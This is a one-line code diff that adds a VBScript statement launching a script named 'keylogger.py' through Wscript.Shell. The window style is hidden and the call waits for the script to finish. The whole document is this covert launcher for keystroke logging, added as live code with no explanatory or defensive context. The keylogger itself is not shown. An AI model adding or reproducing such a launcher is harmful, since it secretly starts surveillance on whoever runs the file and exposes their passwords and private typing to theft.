@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "keylogger.py", 0, True
